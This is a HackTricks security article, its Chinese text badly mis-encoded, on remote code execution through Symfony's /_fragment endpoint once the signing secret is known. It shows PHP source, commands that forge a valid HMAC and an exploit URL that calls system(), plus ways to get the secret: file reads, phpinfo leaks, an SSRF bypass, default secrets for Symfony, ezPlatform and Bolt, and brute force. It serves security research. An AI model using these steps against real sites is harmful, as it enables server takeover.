# Symfony

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ç®€ä»‹ <a href="#introduction" id="introduction"></a>

è‡ª2008å¹´åˆ›å»ºä»¥æ¥ï¼Œ[Symfony](https://symfony.com)æ¡†æ¶åœ¨åŸºäºPHPçš„åº”ç”¨ç¨‹åºä¸­çš„ä½¿ç”¨è¶Šæ¥è¶Šå¹¿æ³›ã€‚å®ƒç°åœ¨æ˜¯è®¸å¤šçŸ¥åCMSçš„æ ¸å¿ƒç»„ä»¶ï¼Œä¾‹å¦‚[Drupal](https://www.drupal.org)ã€[Joomla!](https://www.joomla.org)ã€[eZPlatform](https://ezplatform.com)ï¼ˆä»¥å‰çš„eZPublishï¼‰æˆ–[Bolt](https://bolt.cm)ï¼Œå¹¶ä¸”ç»å¸¸ç”¨äºæ„å»ºå®šåˆ¶ç½‘ç«™ã€‚

Symfonyå†…ç½®çš„ä¸€ä¸ªç‰¹æ€§ï¼Œç”¨äºå¤„ç†[ESIï¼ˆè¾¹ç¼˜ä¾§åŒ…å«ï¼‰](https://en.wikipedia.org/wiki/Edge\_Side\_Includes)ï¼Œæ˜¯[`FragmentListener`ç±»](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php)ã€‚æœ¬è´¨ä¸Šï¼Œå½“æœ‰äººå‘`/_fragment`å‘å‡ºè¯·æ±‚æ—¶ï¼Œæ­¤ç›‘å¬å™¨ä¼šæ ¹æ®ç»™å®šçš„GETå‚æ•°è®¾ç½®è¯·æ±‚å±æ€§ã€‚ç”±äºè¿™å…è®¸**è¿è¡Œä»»æ„PHPä»£ç **ï¼ˆ_ç¨åè¯¦ç»†è¯´æ˜_ï¼‰ï¼Œè¯·æ±‚å¿…é¡»ä½¿ç”¨HMACå€¼è¿›è¡Œç­¾åã€‚è¿™ä¸ªHMACçš„ç§˜å¯†åŠ å¯†å¯†é’¥å­˜å‚¨åœ¨åä¸º`secret`çš„Symfonyé…ç½®å€¼ä¸‹ã€‚

è¿™ä¸ªé…ç½®å€¼`secret`ï¼Œä¹Ÿç”¨äºæ„å»ºCSRFä»¤ç‰Œå’Œè®°ä½æˆ‘ä»¤ç‰Œã€‚é‰´äºå…¶é‡è¦æ€§ï¼Œè¿™ä¸ªå€¼æ˜¾ç„¶å¿…é¡»éå¸¸éšæœºã€‚

ä¸å¹¸çš„æ˜¯ï¼Œæˆ‘ä»¬å‘ç°é€šå¸¸æƒ…å†µä¸‹ï¼Œç§˜å¯†è¦ä¹ˆæœ‰ä¸€ä¸ª**é»˜è®¤å€¼**ï¼Œè¦ä¹ˆå­˜åœ¨**è·å–è¯¥å€¼ã€ç¦»çº¿æš´åŠ›ç ´è§£æˆ–å®Œå…¨ç»•è¿‡ä¸ä¹‹ç›¸å…³çš„å®‰å…¨æ£€æŸ¥çš„æ–¹æ³•**ã€‚å®ƒå°¤å…¶å½±å“Boltã€eZPlatformå’ŒeZPublishã€‚

è™½ç„¶è¿™çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªè‰¯æ€§é…ç½®é—®é¢˜ï¼Œä½†æˆ‘ä»¬å‘ç°åœ¨ä¸Šè¿°CMSä»¥åŠå®šåˆ¶åº”ç”¨ç¨‹åºä¸­ï¼Œé»˜è®¤å€¼ã€å¯æš´åŠ›ç ´è§£æˆ–å¯çŒœæµ‹çš„å€¼**éå¸¸éå¸¸å¸¸è§**ã€‚è¿™ä¸»è¦æ˜¯å› ä¸ºåœ¨æ–‡æ¡£æˆ–å®‰è£…æŒ‡å—ä¸­æ²¡æœ‰è¶³å¤Ÿå¼ºè°ƒå…¶é‡è¦æ€§ã€‚

æ­¤å¤–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‡çº§å½±å“è¾ƒå°çš„æ¼æ´æ¥è¯»å–`secret`ï¼ˆé€šè¿‡æ–‡ä»¶æ³„éœ²ï¼‰ã€ç»•è¿‡`/_fragment`ç­¾åè¿‡ç¨‹ï¼ˆä½¿ç”¨SSRFï¼‰ï¼Œç”šè‡³é€šè¿‡`phpinfo()`æ³„éœ²å®ƒï¼

åœ¨è¿™ç¯‡åšå®¢æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†æè¿°å¦‚ä½•åœ¨å„ç§CMSå’ŒåŸºç¡€æ¡†æ¶ä¸­è·å–ç§˜å¯†ï¼Œå¹¶ä½¿ç”¨è¯¥ç§˜å¯†æ‰§è¡Œä»£ç ã€‚

## ä¸€ç‚¹å†å² <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

ä½œä¸ºä¸€ä¸ªç°ä»£æ¡†æ¶ï¼ŒSymfonyä»åˆ›å»ºåˆ°ç°åœ¨ä¸€ç›´éœ€è¦å¤„ç†è¯·æ±‚çš„å­éƒ¨åˆ†çš„ç”Ÿæˆã€‚åœ¨`/_fragment`ä¹‹å‰ï¼Œæœ‰`/_internal`å’Œ`/_proxy`ï¼Œå®ƒä»¬æœ¬è´¨ä¸Šåšçš„æ˜¯åŒæ ·çš„äº‹æƒ…ã€‚è¿™å¤šå¹´æ¥äº§ç”Ÿäº†å¾ˆå¤šæ¼æ´ï¼šä¾‹å¦‚[CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes)ã€[CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy)å’Œ[CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access)ã€‚

è‡ªSymfony 4èµ·ï¼Œå®‰è£…æ—¶ä¼šç”Ÿæˆç§˜å¯†ï¼Œå¹¶é»˜è®¤ç¦ç”¨`/_fragment`é¡µé¢ã€‚å› æ­¤ï¼Œäººä»¬ä¼šè®¤ä¸ºï¼Œæ‹¥æœ‰å¼±`secret`å’Œå¯ç”¨`/_fragment`çš„æƒ…å†µä¼šå¾ˆå°‘è§ã€‚äº‹å®å¹¶éå¦‚æ­¤ï¼šè®¸å¤šæ¡†æ¶ä¾èµ–äºæ—§çš„Symfonyç‰ˆæœ¬ï¼ˆç”šè‡³2.xç‰ˆæœ¬ä»ç„¶éå¸¸æ™®éï¼‰ï¼Œå¹¶å®ç°äº†é™æ€çš„`secret`å€¼æˆ–ç”Ÿæˆå®ƒçš„æ–¹å¼å¾ˆå·®ã€‚æ­¤å¤–ï¼Œè®¸å¤šæ¡†æ¶ä¾èµ–äºESIï¼Œå› æ­¤å¯ç”¨äº†`/_fragment`é¡µé¢ã€‚è€Œä¸”ï¼Œæ­£å¦‚æˆ‘ä»¬å°†çœ‹åˆ°çš„ï¼Œå…¶ä»–ä½å½±å“çš„æ¼æ´å¯ä»¥å…è®¸æ³„éœ²ç§˜å¯†ï¼Œå³ä½¿å®ƒå·²ç»è¢«å®‰å…¨ç”Ÿæˆã€‚

## åœ¨`secret`çš„å¸®åŠ©ä¸‹æ‰§è¡Œä»£ç  <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

æˆ‘ä»¬å°†é¦–å…ˆæ¼”ç¤ºæ”»å‡»è€…åœ¨çŸ¥é“`secret`é…ç½®å€¼çš„æƒ…å†µä¸‹å¦‚ä½•è·å¾—ä»£ç æ‰§è¡Œã€‚è¿™æ˜¯é’ˆå¯¹æœ€æ–°çš„`symfony/http-kernel`ç‰ˆæœ¬ï¼Œä½†å¯¹å…¶ä»–ç‰ˆæœ¬ä¹Ÿç±»ä¼¼ã€‚

### ä½¿ç”¨`/_fragment`è¿è¡Œä»»æ„ä»£ç  <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬å°†åˆ©ç”¨`/_fragment`é¡µé¢ã€‚
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
`FragmentListener:onKernelRequest` åœ¨æ¯ä¸ªè¯·æ±‚ä¸Šè¿è¡Œï¼šå¦‚æœè¯·æ±‚çš„è·¯å¾„æ˜¯ `/_fragment` \[1]ï¼Œè¯¥æ–¹æ³•å°†é¦–å…ˆæ£€æŸ¥è¯·æ±‚æ˜¯å¦æœ‰æ•ˆï¼ˆ_å³_ æ˜¯å¦æ­£ç¡®ç­¾åï¼‰ï¼Œå¦åˆ™å°†å¼•å‘å¼‚å¸¸ \[2]ã€‚å¦‚æœå®‰å…¨æ£€æŸ¥æˆåŠŸï¼Œå®ƒå°†è§£æ url ç¼–ç çš„ `_path` å‚æ•°ï¼Œå¹¶ç›¸åº”åœ°è®¾ç½® `$request` å±æ€§ã€‚

è¯·æ±‚å±æ€§ä¸åº”ä¸ HTTP è¯·æ±‚å‚æ•°æ··æ·†ï¼šå®ƒä»¬æ˜¯ Symfony ç»´æŠ¤çš„å†…éƒ¨å€¼ï¼Œé€šå¸¸ç”¨æˆ·æ— æ³•æŒ‡å®šã€‚è¿™äº›è¯·æ±‚å±æ€§ä¹‹ä¸€æ˜¯ `_controller`ï¼Œå®ƒæŒ‡å®šäº†è¦è°ƒç”¨çš„ Symfony æ§åˆ¶å™¨ï¼ˆä¸€ä¸ª _(ç±», æ–¹æ³•)_ å…ƒç»„ï¼Œæˆ–è€…ç®€å•åœ°è¯´æ˜¯ä¸€ä¸ª _å‡½æ•°_ï¼‰ã€‚åç§°ä¸ä»¥ `_` å¼€å¤´çš„å±æ€§æ˜¯å°†è¦ä¼ é€’ç»™æ§åˆ¶å™¨çš„å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼š
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
æˆ‘ä»¬å°†`_path`è®¾ç½®ä¸ºï¼š

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

é‚£ä¹ˆè¯·æ±‚çœ‹èµ·æ¥å°±åƒè¿™æ ·ï¼š

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

æœ¬è´¨ä¸Šï¼Œè¿™å…è®¸è°ƒç”¨ä»»ä½•å‡½æ•°ï¼Œæˆ–ä»»ä½•ç±»çš„ä»»ä½•æ–¹æ³•ï¼Œä½¿ç”¨ä»»ä½•å‚æ•°ã€‚é‰´äºSymfonyæ‹¥æœ‰çš„ç±»æ•°é‡ä¼—å¤šï¼Œ**å®ç°ä»£ç æ‰§è¡Œéå¸¸ç®€å•**ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨`system()`ï¼š

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_è°ƒç”¨systemå¹¶ä¸æ€»æ˜¯æœ‰æ•ˆï¼šæœ‰å…³åˆ©ç”¨ç»†èŠ‚ï¼Œè¯·å‚é˜…Exploitéƒ¨åˆ†ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚_

è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šSymfonyæ˜¯å¦‚ä½•éªŒè¯è¯·æ±‚çš„ç­¾åçš„ï¼Ÿ

### ç­¾åURL <a href="#signing-the-url" id="signing-the-url"></a>

ä¸ºäº†éªŒè¯URLçš„ç­¾åï¼Œä¼šå¯¹_å®Œæ•´_çš„URLè®¡ç®—ä¸€ä¸ªHMACã€‚ç„¶åå°†è·å¾—çš„å“ˆå¸Œå€¼ä¸ç”¨æˆ·æŒ‡å®šçš„å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒã€‚

åœ¨ä»£ç ä¸­ï¼Œè¿™æ˜¯åœ¨ä¸¤ä¸ªåœ°æ–¹å®Œæˆçš„ï¼š
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
ç®€è€Œè¨€ä¹‹ï¼ŒSymfony æå– `_hash` GET å‚æ•°ï¼Œç„¶åé‡æ„å®Œæ•´çš„ URLï¼Œä¾‹å¦‚ `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`ï¼Œä½¿ç”¨ `secret` ä½œä¸ºå¯†é’¥è®¡ç®—è¯¥ URL çš„ HMAC \[1]ï¼Œå¹¶å°†å…¶ä¸ç»™å®šçš„å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒ \[2]ã€‚å¦‚æœä¸åŒ¹é…ï¼Œå°†å¼•å‘ `AccessDeniedHttpException` å¼‚å¸¸ \[3]ï¼Œå¯¼è‡´ `403` é”™è¯¯ã€‚

### ç¤ºä¾‹ <a href="#example" id="example"></a>

ä¸ºäº†æµ‹è¯•è¿™ä¸€ç‚¹ï¼Œè®©æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¹¶æå–å¯†é’¥ï¼ˆåœ¨æœ¬ä¾‹ä¸­ï¼Œæ˜¯éšæœºç”Ÿæˆçš„ï¼‰ã€‚
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
ç°åœ¨ï¼Œè®¿é—® `http://localhost:8000/_fragment` ä¼šå‡ºç° `403`ã€‚ç°åœ¨æˆ‘ä»¬å°è¯•æä¾›ä¸€ä¸ªæœ‰æ•ˆçš„ç­¾åï¼š
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
åœ¨è®¿é—® `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D` æ—¶ï¼Œæˆ‘ä»¬ç°åœ¨å¾—åˆ°äº†ä¸€ä¸ª `404` çŠ¶æ€ç ã€‚ç­¾åæ˜¯æ­£ç¡®çš„ï¼Œä½†æˆ‘ä»¬æ²¡æœ‰æŒ‡å®šä»»ä½•è¯·æ±‚å±æ€§ï¼Œå› æ­¤Symfonyæ‰¾ä¸åˆ°æˆ‘ä»¬çš„æ§åˆ¶å™¨ã€‚

ç”±äºæˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»ä½•æ–¹æ³•ï¼Œä½¿ç”¨ä»»ä½•å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹© `system($command, $return_value)`ï¼Œå¹¶æä¾›å¦‚ä¸‹è½½è·ï¼š
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
æˆ‘ä»¬ç°åœ¨å¯ä»¥è®¿é—®åˆ©ç”¨URLï¼š`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`ã€‚

å°½ç®¡å‡ºç°äº†`500`é”™è¯¯ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°**æˆ‘ä»¬çš„å‘½ä»¤è¢«æ‰§è¡Œäº†**ã€‚

_ä½¿ç”¨ç‰‡æ®µè¿›è¡ŒRCE_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## å¯»æ‰¾ç§˜å¯† <a href="#finding-secrets" id="finding-secrets"></a>

å†æ¬¡å¼ºè°ƒï¼šå¦‚æœç§˜å¯†æ— æ³•è·å–ï¼Œè¿™ä¸€åˆ‡éƒ½æ— å…³ç´§è¦ã€‚ä½†å¾€å¾€å®ƒä»¬æ˜¯å¯ä»¥è·å–çš„ã€‚æˆ‘ä»¬å°†æè¿°å‡ ç§åœ¨æ²¡æœ‰ä»»ä½•å…ˆéªŒçŸ¥è¯†çš„æƒ…å†µä¸‹è·å–ä»£ç æ‰§è¡Œçš„æ–¹æ³•ã€‚

### é€šè¿‡æ¼æ´ <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

è®©æˆ‘ä»¬ä»æ˜¾è€Œæ˜“è§çš„å¼€å§‹ï¼šä½¿ç”¨ä½å½±å“çš„æ¼æ´æ¥è·å–ç§˜å¯†ã€‚

#### æ–‡ä»¶è¯»å– <a href="#file-read" id="file-read"></a>

æ˜¾ç„¶ï¼Œæ–‡ä»¶è¯»å–æ¼æ´å¯ä»¥ç”¨æ¥è¯»å–ä»¥ä¸‹æ–‡ä»¶ï¼Œå¹¶è·å–`secret`ï¼š

* `app/config/parameters.yml`
* `.env`

_ä¾‹å¦‚ï¼Œä¸€äº›Symfonyè°ƒè¯•å·¥å…·æ å…è®¸ä½ è¯»å–æ–‡ä»¶ã€‚_

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

åœ¨æœ€è¿‘çš„Symfonyç‰ˆæœ¬ï¼ˆ3.xï¼‰ä¸­ï¼Œ`secret`ä½œä¸º`APP_SECRET`å­˜å‚¨åœ¨`.env`ä¸­ã€‚ç”±äºå®ƒéšåè¢«å¯¼å…¥ä¸ºä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒä»¬å¯ä»¥é€šè¿‡`phpinfo()`é¡µé¢çœ‹åˆ°ã€‚

_é€šè¿‡phpinfoæ³„éœ²APP_SECRET_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

è¿™é€šå¸¸å¯ä»¥é€šè¿‡Symfonyçš„åˆ†æå™¨åŒ…å®Œæˆï¼Œå¦‚æˆªå›¾æ‰€ç¤ºã€‚

#### SSRF / IPæ¬ºéª— (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

`FragmentListener`èƒŒåçš„ä»£ç éšç€æ—¶é—´çš„æ¨ç§»è€Œå‘å±•ï¼šç›´åˆ°ç‰ˆæœ¬_2.5.3_ï¼Œå½“è¯·æ±‚æ¥è‡ªå—ä¿¡ä»»çš„ä»£ç†ï¼ˆå³ï¼š`localhost`ï¼‰æ—¶ï¼Œå®ƒä¼šè¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œå› æ­¤ä¸ä¼šæ£€æŸ¥å“ˆå¸Œã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªSSRFå¯ä»¥å…è®¸ç«‹å³è¿è¡Œä»£ç ï¼Œæ— è®ºæ˜¯å¦æ‹¥æœ‰`secret`ã€‚è¿™ç‰¹åˆ«å½±å“äº†eZPublishç›´åˆ°2014.7ç‰ˆæœ¬ã€‚
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
è¯šç„¶ï¼Œæ‰€æœ‰è¿™äº›æŠ€æœ¯éƒ½éœ€è¦å¦ä¸€ä¸ªæ¼æ´ã€‚è®©æˆ‘ä»¬æ·±å…¥äº†è§£ä¸€ä¸ªæ›´å¥½çš„å‘é‡ï¼šé»˜è®¤å€¼ã€‚

### é€šè¿‡é»˜è®¤å€¼ <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

åœ¨è®¾ç½®Symfonyç½‘ç«™æ—¶ï¼Œç¬¬ä¸€æ­¥æ˜¯å®‰è£…[symfony-standard](https://github.com/symfony/symfony-standard)éª¨æ¶ã€‚å®‰è£…åï¼Œç³»ç»Ÿä¼šæç¤ºè¾“å…¥ä¸€äº›é…ç½®å€¼ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯†é’¥æ˜¯`ThisTokenIsNotSoSecretChangeIt`ã€‚

_Symfonyé€šè¿‡composerå®‰è£…_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

åœ¨åç»­ç‰ˆæœ¬ï¼ˆ4+ï¼‰ä¸­ï¼Œå¯†é’¥ä¼šå®‰å…¨ç”Ÿæˆã€‚

#### ezPlatform 3.xï¼ˆæœ€æ–°ï¼‰: `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com)ï¼Œ[ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish)çš„ç»§ä»»è€…ï¼Œä»ç„¶ä½¿ç”¨Symfonyã€‚åœ¨2019å¹´6æœˆ10æ—¥ï¼Œä¸€ä¸ª[æäº¤](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59)å°†é»˜è®¤å¯†é’¥è®¾ç½®ä¸º`ff6dc61a329dc96652bb092ec58981f7`ã€‚æ˜“å—æ”»å‡»çš„ç‰ˆæœ¬èŒƒå›´ä»3.0-alpha1åˆ°3.1.1ï¼ˆå½“å‰ï¼‰ã€‚

å°½ç®¡[æ–‡æ¡£](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters)æŒ‡å‡ºåº”è¯¥æ›´æ”¹å¯†é’¥ï¼Œä½†è¿™å¹¶ä¸æ˜¯å¼ºåˆ¶æ€§çš„ã€‚

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

åƒSymfonyçš„éª¨æ¶ä¸€æ ·ï¼Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿä¼šæç¤ºæ‚¨è¾“å…¥ä¸€ä¸ªå¯†é’¥ã€‚é»˜è®¤å€¼æ˜¯`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`ã€‚

#### Bolt CMS <= 3.7ï¼ˆæœ€æ–°ï¼‰: `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm)ä½¿ç”¨äº†åŸºäºSymfonyçš„å·²å¼ƒç”¨å¾®æ¡†æ¶[Silex](https://github.com/silexphp/Silex)ã€‚å®ƒä½¿ç”¨ä»¥ä¸‹è®¡ç®—è®¾ç½®å¯†é’¥ï¼š
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
å› æ­¤ï¼Œäººä»¬å¯ä»¥çŒœæµ‹å¯†é’¥ï¼Œæˆ–è€…åˆ©ç”¨å®Œæ•´è·¯å¾„æ³„éœ²æ¼æ´æ¥è®¡ç®—å®ƒã€‚

å¦‚æœæ‚¨æ²¡æœ‰ä½¿ç”¨é»˜è®¤å¯†é’¥æˆåŠŸï¼Œä¸è¦å¤±æœ›ï¼šè¿˜æœ‰å…¶ä»–æ–¹æ³•ã€‚

### æš´åŠ›ç ´è§£ <a href="#bruteforce" id="bruteforce"></a>

ç”±äºå¯†é’¥é€šå¸¸æ˜¯æ‰‹åŠ¨è®¾ç½®çš„ï¼ˆè€Œä¸æ˜¯éšæœºç”Ÿæˆçš„ï¼‰ï¼Œäººä»¬é€šå¸¸ä¼šä½¿ç”¨å£ä»¤çŸ­è¯­è€Œä¸æ˜¯å®‰å…¨çš„éšæœºå€¼ï¼Œè¿™ä½¿å¾—å¦‚æœæˆ‘ä»¬æœ‰å“ˆå¸Œæ¥å¯¹å…¶è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå®ƒå°±å¯ä»¥è¢«æš´åŠ›ç ´è§£ã€‚æ˜¾ç„¶ï¼Œä¸€ä¸ªæœ‰æ•ˆçš„ `/_fragment` URLï¼Œä¾‹å¦‚ç”±Symfonyç”Ÿæˆçš„ï¼Œå°†ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªæœ‰æ•ˆçš„æ¶ˆæ¯-å“ˆå¸Œå…ƒç»„æ¥æš´åŠ›ç ´è§£å¯†é’¥ã€‚

_æœ‰æ•ˆçš„ç‰‡æ®µè¯·æ±‚åŒ…å«åœ¨å“åº”ä¸­_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

